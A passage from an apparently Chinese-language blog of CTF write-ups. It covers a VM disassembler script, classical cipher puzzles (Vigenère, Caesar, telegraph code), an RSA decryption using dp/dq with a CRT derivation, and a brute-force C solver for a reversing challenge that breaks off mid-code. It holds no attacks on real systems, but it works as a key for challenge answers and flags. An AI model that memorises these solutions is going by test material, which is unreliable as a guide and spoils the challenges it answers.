reg[%d],reg[%d];reg[1]=*reg[a2]&#x27;</span>%(op1,op2)</span><br><span class="line">        </span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">12</span>:</span><br><span class="line">        s=<span class="string">&#x27;add8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;add8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">14</span>:</span><br><span class="line">        s=<span class="string">&#x27;addp reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;addp reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">16</span>:</span><br><span class="line">        s=<span class="string">&#x27;addp8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;addp8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">18</span>:</span><br><span class="line">        s=<span class="string">&#x27;xor32 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;xor32 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">20</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> off:</span><br><span class="line">            s=<span class="string">&#x27;mod8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">22</span>:</span><br><span class="line">        s=<span class="string">&#x27;or8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;or8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">24</span>:</span><br><span class="line">        s=<span class="string">&#x27;and8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;and8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">26</span>:</span><br><span class="line">        s=<span class="string">&#x27;push reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;push reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">28</span>:</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;pop reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">            ip+=<span class="number">2</span></span><br><span class="line">        ip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">30</span>:</span><br><span class="line">        s=<span class="string">&#x27;shr8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;shr8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">32</span>:</span><br><span class="line">        s=<span class="string">&#x27;shl8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;shl8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">34</span>:</span><br><span class="line">        s=<span class="string">&#x27;ror32 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;ror32 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">36</span>:</span><br><span class="line">        s=<span class="string">&#x27;cmp32 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;cmp32 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">38</span>:</span><br><span class="line">        s=<span class="string">&#x27;cmpeq8 reg[%d],%d&#x27;</span>%(op1,op2)</span><br><span class="line">        <span class="keyword">if</span> off:</span><br><span class="line">            s=<span class="string">&#x27;cmpeq8 reg[%d],reg[%d]&#x27;</span>%(op1,op2)</span><br><span class="line">        ip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">40</span>:</span><br><span class="line">        <span class="keyword">if</span> last!=<span class="number">0</span>:</span><br><span class="line">            s=<span class="string">&#x27;jnz %02x&#x27;</span>%last</span><br><span class="line">            last=<span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s=<span class="string">&#x27;record ip:%02x&#x27;</span>%ip</span><br><span class="line">            last=ip</span><br><span class="line">        ip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">42</span>:</span><br><span class="line">        s=<span class="string">&#x27;print result&#x27;</span></span><br><span class="line">        ip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s=<span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">        ip+=<span class="number">1</span></span><br><span class="line">    print(s,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&quot;;reg[%d] is %s,reg[%d] is %s&quot;</span>%(op1,reg[op1],op2,reg[op2]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">res = [<span class="number">0x75</span>, <span class="number">0x85</span>, <span class="number">0xd1</span>, <span class="number">0x39</span>, <span class="number">0xb</span>, <span class="number">0x29</span>, <span class="number">0xcd</span>, <span class="number">0x77</span>, <span class="number">0x6d</span>, <span class="number">0x9f</span>, <span class="number">0x73</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0x8b</span>, <span class="number">0x4d</span>, <span class="number">0x45</span>, <span class="number">0x9d</span>, <span class="number">0x8f</span>, <span class="number">0x5b</span>, <span class="number">0x11</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0xe5</span>, <span class="number">0xcf</span>, <span class="number">0x45</span>, <span class="number">0xe5</span>, <span class="number">0xb1</span>, <span class="number">0xb3</span>, <span class="number">0x41</span>, <span class="number">0xd9</span>, <span class="number">0xcf</span>, <span class="number">0xcf</span>]</span><br><span class="line">r1 = []</span><br><span class="line">x = <span class="number">0xEFBEADDE</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    r1.append(((x+i)^(res[i]))&amp;<span class="number">0xff</span>)</span><br><span class="line">    x = (x&gt;&gt;<span class="number">8</span>)|(x&lt;&lt;(<span class="number">32</span><span class="number">-8</span>))&amp;<span class="number">0xffffffff</span></span><br><span class="line">r2 = [<span class="number">0</span>]*len(r1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(r1)):</span><br><span class="line">    r2[i]=(r1[i]&gt;&gt;<span class="number">3</span>)|(r1[i<span class="number">-1</span>]&lt;&lt;<span class="number">5</span>)&amp;<span class="number">0xff</span></span><br><span class="line">print(bytes(r2))</span><br><span class="line">tab = [i*<span class="number">51</span>%<span class="number">32</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>)]</span><br><span class="line">print(tab)</span><br><span class="line">rtab = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tab)):</span><br><span class="line">    rtab[tab[i]]=i</span><br><span class="line">s = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(r2)):</span><br><span class="line">    s[tab[i]]=r2[i]</span><br><span class="line">print(bytes(s))</span><br><span class="line"></span><br><span class="line"><span class="comment">#xman&#123;ae791f19bdf77357ff10bb6b0e&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="crypto-BJDCTF-2nd-老文盲了"><a href="#crypto-BJDCTF-2nd-老文盲了" class="headerlink" title="[crypto][BJDCTF 2nd]老文盲了"></a>[crypto][BJDCTF 2nd]老文盲了</h2><p>看起来像与佛论禅，实际是考读音和语义</p>
<p><a target="_blank" rel="noopener" href="https://pinyin.supfree.net/">https://pinyin.supfree.net/</a></p>
<p>bjd{这就是flag直接交了吧}</p>
<h2 id="Crypto-Windows系统密码"><a href="#Crypto-Windows系统密码" class="headerlink" title="[Crypto][Windows系统密码]"></a>[Crypto][Windows系统密码]</h2><p>windows加密方式，打开后应该是冒号前后是两个md5，我以为是一个呢555</p>
<h2 id="Crypto-BJDCTF-2nd-燕言燕语-y1ng"><a href="#Crypto-BJDCTF-2nd-燕言燕语-y1ng" class="headerlink" title="[Crypto][BJDCTF 2nd]燕言燕语-y1ng"></a>[Crypto][BJDCTF 2nd]燕言燕语-y1ng</h2><p>一串东西难以复制，只能f12= =</p>
<p>看起来是ASCII序列，直接解出一个串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125;</span><br></pre></td></tr></table></figure>
<p>在线解密<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p>
<p>所以大佬是怎么看出这时维吉尼亚密码的，可以去解密网站解密，但是更好的是学习一下维吉尼亚密码的加密方式</p>
<h2 id="crypto-传统知识-古典密码"><a href="#crypto-传统知识-古典密码" class="headerlink" title="[crypto]传统知识+古典密码"></a>[crypto]传统知识+古典密码</h2><p>原来天干地支有个表的，查表就可以了</p>
<p><a target="_blank" rel="noopener" href="http://114.xixik.com/tiangandizhi/">http://114.xixik.com/tiangandizhi/</a></p>
<p>辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳 +甲子就加那个数</p>
<p>28,30，23，8,17，10，16，30</p>
<p>一个甲子是60，原来是这么算的</p>
<p>然后还有凯撒加密和栅栏加密(这种尝试就好了吗)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">r1=[<span class="number">28</span>,<span class="number">30</span>,<span class="number">23</span>,<span class="number">8</span>,<span class="number">17</span>,<span class="number">10</span>,<span class="number">16</span>,<span class="number">30</span>]</span><br><span class="line">r = [i <span class="keyword">for</span> i <span class="keyword">in</span> r1]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(r)):</span><br><span class="line">        r1[j]=r[j]+<span class="number">60</span></span><br><span class="line">        r1[j]=(r1[j]<span class="number">-65</span>+i)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">    print(bytes(r1))</span><br></pre></td></tr></table></figure>
<h2 id="crypto-信息时代的步伐"><a href="#crypto-信息时代的步伐" class="headerlink" title="[crypto]信息时代的步伐"></a>[crypto]信息时代的步伐</h2><p>中文电码，是电报中传送中文信息的方法</p>
<p><a target="_blank" rel="noopener" href="http://code.mcdvisa.com/">http://code.mcdvisa.com/</a></p>
<p>还有典故 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%AD%E6%96%87%E7%94%B5%E7%A0%81/2667759?fr=aladdin">https://baike.baidu.com/item/%E4%B8%AD%E6%96%87%E7%94%B5%E7%A0%81/2667759?fr=aladdin</a></p>
<p>中文电码即一个数字代表一个编码，4位数字，具体编码有差异</p>
<h2 id="Crypto-RSA1"><a href="#Crypto-RSA1" class="headerlink" title="[Crypto]RSA1"></a>[Crypto]RSA1</h2><p>参考自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32350719/article/details/102719279">https://blog.csdn.net/qq_32350719/article/details/102719279</a></p>
<p>原来dp是d mod (p-1)的意思</p>
<p>设$m,m_1,m_2$分别为明文，$m_1\equiv m\mod p,m_2\equiv m\mod q,d$为解密密钥</p>
<p>这样一来就是同余式方程组了，根据中国剩余定理有</p>
<p>$$<br>m_1=c^d \mod p\m_2=c^d\mod q<br>$$</p>
<p>证明</p>
<p>$m=c^d+p<em>q</em>k,m\mod p=c^d\mod p,m\mod q=c^d\mod q$</p>
<p>可以得到</p>
<p>$c^d=kp+m_1$，带入$m_2$，得$m_2=(kp+m_1)\mod q$</p>
<p>两边同时减去$m_1$，得到$m_2-m_1=kp\mod q$</p>
<p>由于$gcd(p,q)=1$，所以$p^{-1}\mod q$存在</p>
<p>$(m_2-m_1)*p^{-1}\equiv k\mod q$</p>
<p>又$\because c^d=kp+m_1$，带入得到$c^d=((m_2-m_1)*p^{-1}\mod q)*p+m_1$</p>
<p>带入$m\equiv c^d\mod n$，得到$m\equiv(((m_2-m_1)*p^{-1}\mod q)*p+m_1)\mod n$</p>
<p>这里需要求$m_1,m_2$</p>
<p>$d\equiv d^p\mod (p-1),d\equiv d^q\mod (q-1)$</p>
<p>证明：根据费马小定理$\because p\ is\ prime\therefore d^{p-1}\equiv 1\mod q$</p>
<p>从而$d=dp+k*(p-1)$，直接带入$m_2=c^{dp+k*(p-1)}\mod p$，$\because c^{k*(p-1)}\equiv 1\mod p$</p>
<p>得到$m_2=c^{dp}\mod p$</p>
<p>同理$m_1=c^{dq}\mod q$</p>
<p>所以解题脚本就出来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">m1 = gmpy2.powmod(c,dp,p)</span><br><span class="line">m2 = gmpy2.powmod(c,dq,q)</span><br><span class="line">m = (((m2-m1)*gmpy2.invert(p,q)%q)*p+m1)%(p*q)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-凯撒？替换？呵呵"><a href="#Crypto-凯撒？替换？呵呵" class="headerlink" title="[Crypto]凯撒？替换？呵呵!"></a>[Crypto]凯撒？替换？呵呵!</h2><p>看wp说是凯撒移位密码，可能是每个字母移动的位置不同，所以需要统计词频来解，直接使用在线工具</p>
<p><a target="_blank" rel="noopener" href="http://quipqiup.com/">http://quipqiup.com/</a></p>
<h2 id="rev-SWPU2019-easyRE"><a href="#rev-SWPU2019-easyRE" class="headerlink" title="[rev][SWPU2019]easyRE"></a>[rev][SWPU2019]easyRE</h2><ol>
<li>找到主函数，发现一个复杂结构体</li>
<li>有正则表达式匹配 <code>^swpuctf\\&#123;\\w&#123;4&#125;\\-\\w&#123;4&#125;\\-\\w&#123;4&#125;\\-\\w&#123;4&#125;\\-\\w&#123;4&#125;\\&#125;</code></li>
<li>调试发现+52处是比对数据,长度40；+12处是输入变换后的数据，长度40</li>
<li>0处是个结构体</li>
<li>本以为是啥加密算法，原来看不懂，wp也说看不懂，但是根据正则表达式可以穷举，范围不太大</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &lt;setimp.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt1</span><span class="params">(<span class="keyword">uint8_t</span> input[<span class="number">4</span>],<span class="keyword">uint8_t</span> res[<span class="number">24</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> v4,v5,v6,v7,v8=<span class="number">0</span>,v9,v10,v11,v16,v17,v18,v19;</span><br><span class="line">    <span class="built_in">memcpy</span>(res,input,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        v4=res[i];</span><br><span class="line">        v5=res[i];</span><br><span class="line">        v7=<span class="number">0</span>;</span><br><span class="line">        v8=<span class="number">0x80</span>;</span><br><span class="line">        <span class="keyword">while</span>(!(res[i]&amp;v8)&amp;&amp;v7&lt;<span class="number">8</span>)&#123;</span><br><span class="line">            v8&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            v7++;</span><br><span class="line">        &#125;</span><br><span class="line">        res[i+<span class="number">8</span>]=v7+<span class="number">1</span>;</span><br><span class="line">        v8=<span class="number">1</span>;</span><br><span class="line">        v7=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(!(res[i]&amp;v8)&amp;&amp;v7&lt;<span class="number">8</span>)&#123;</span><br><span class="line">            v8&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">            v7++;</span><br><span class="line">        &#125;</span><br><span class="line">        res[i+<span class="number">12</span>]=v7<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        res[i+<span class="number">4</span>] = res[i+<span class="number">12</span>] + res[i+<span class="number">8</span>];</span><br><span class="line">        res[i+<span class="number">16</span>] = res[i] &lt;&lt; res[i+<span class="number">8</span>];</span><br><span class="line">        res[i+<span class="number">16</span>] = res[i+<span class="number">16</span>] &gt;&gt; res[i+<span class="number">4</span>];</span><br><span class="line">        v18 = <span class="number">8</span> - res[i+<span class="number">8</span>];</span><br><span class="line">        v16 = res[i] &gt;&gt; v18;</span><br><span class="line">        v17 = <span class="number">8</span> - res[i+<span class="number">12</span>];</span><br><span class="line">        v19 = res[i] &lt;&lt; v17;</span><br><span class="line">        v19 &gt;&gt;= res[i+<span class="number">4</span>];</span><br><span class="line">        res[i+<span class="number">20</span>] = v19 | (v16 &lt;&lt; res[i+<span class="number">8</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> v14 = <span class="number">32</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt2</span><span class="params">(<span class="keyword">uint8_t</span> input[<span class="number">24</span>],<span class="keyword">uint8_t</span> res[<span class="number">40</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> test[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> *v15 = res;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;=<span class="number">4</span>)&#123;</span><br><span class="line">            v14-=input[i];</span><br><span class="line">            *(<span class="keyword">uint32_t</span> *)v15|=input[i+<span class="number">16</span>]&lt;&lt;v14;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            v14-=(<span class="number">8</span>-input[i+<span class="number">4</span>]);</span><br><span class="line">            *(<span class="keyword">uint32_t</span> *)v15|=input[i+<span class="number">16</span>]&lt;&lt;v14;</span><br><span class="line">            v15[i+<span class="number">20</span>]=input[i+<span class="number">12</span>]|input[i+<span class="number">8</span>]&lt;&lt;<span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute</span><span class="params">(<span class="keyword">uint8_t</span> input[<span class="number">4</span>],<span class="keyword">uint8_t</span> target[<span class="number">8</span>])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tab[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_/&quot;</span>;</span><br><span class="line">    <span class="keyword">size_t</span> scope = <span class="built_in">strlen</span>(tab);</span><br><span class="line">    <span class="keyword">uint8_t</span> r[<span class="number">24</span>],rr[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i1=<span class="number">0</span>;i1&lt;scope;i1++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> i2=<span class="number">0</span>;i2&lt;scope;i2++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">size_t</span> i3=<span class="number">0</span>;i3&lt;scope;i3++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">size_t</span> i4=<span class="number">0</span>;i4&lt;scope;i4++)&#123;</span><br><span class="line">                    v14=<span class="number">32</span>;</span><br><span class="line">                    input[<span class="number">0</span>]=tab[i1];</span><br><span class="line">                    input[<span class="number">1</span>]=tab[i2];</span><br><span class="line">                    input[<span class="number">2</span>]=tab[i3];</span><br><span class="line">                    input[<span class="number">3</span>]=tab[i4];</span><br><span class="line">                    <span class="built_in">memset</span>(r,<span class="number">0</span>,<span class="number">24</span>);</span><br><span class="line">                    <span class="built_in">memset</span>(rr,<span class="number">0</span>,<span class="number">40</span>);</span><br><span class="line">                    encrypt1(input,r);</span><br><span class="line">                    encrypt2(r,rr);</span><br><span class="line">                    <span class="keyword">if</span>(rr[<span class="number">0</span>]==target[<span class="number">0</span>]&amp;&amp;rr[<span class="number">1</span>]==target[<span class="number">1</span>]&amp;&amp;rr[<span class="number">2</span>]==target[<span class="number">2</span>]&amp;&amp;rr[<span class="number">3</span>]==target[<span class="number">3</span>]&amp;&amp;rr[<span class="number">20</span>]==target[<span class="number">4</span>]&amp;&amp;rr[<span class="number">21</span>]==target[<span class="number">5</span>]&amp;&amp;target[<span class="number">6</span>]==rr[<span class="number">22</span>]&amp;&amp;target[<span class="number">7</span>]==rr[<span class="number">23</span>])&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,input);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">           